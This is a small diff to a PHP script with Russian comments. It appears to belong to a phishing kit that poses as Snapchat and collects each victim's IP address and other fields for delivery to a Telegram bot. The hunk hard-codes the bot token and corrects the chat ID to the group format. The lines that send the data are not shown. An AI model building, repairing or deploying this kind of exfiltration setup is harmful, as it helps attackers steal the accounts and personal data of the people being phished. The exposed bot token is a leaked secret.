@@ -15,7 +15,7 @@ $service = "Snapchat";
 где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */
 
 $token = "5621562429:AAFI4GKbo3pJiG4JDA3AOAixKZXBW9NGEWM";
-$chat_id = "1001638250916";
+$chat_id = "-1001638250916";
 $arr = array(
   'Сервис: ' => $service,
   'IP адресс: ' => $ipaddress,
